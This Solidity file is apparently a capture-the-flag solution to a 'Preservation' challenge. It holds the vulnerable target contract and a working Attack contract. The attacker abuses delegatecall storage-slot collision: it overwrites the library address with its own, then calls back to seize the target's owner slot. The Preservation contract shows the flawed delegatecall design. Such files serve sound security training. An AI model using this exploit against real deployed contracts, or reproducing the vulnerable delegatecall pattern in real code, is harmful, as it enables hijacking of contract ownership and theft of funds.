// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation public target;

    function attack(address _target) external {
        target = Preservation(_target);
        // this will set the timeZone1Library address = address of Attack contract
        target.setFirstTime(uint256(uint160(address(this))));
        // This will call the setTime(uint256 _owner) of Attack contract
        target.setFirstTime(uint256(uint160(msg.sender)));
        // Check to see whether our hack works
        require(target.owner() == msg.sender, "Hack is Failed");
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}
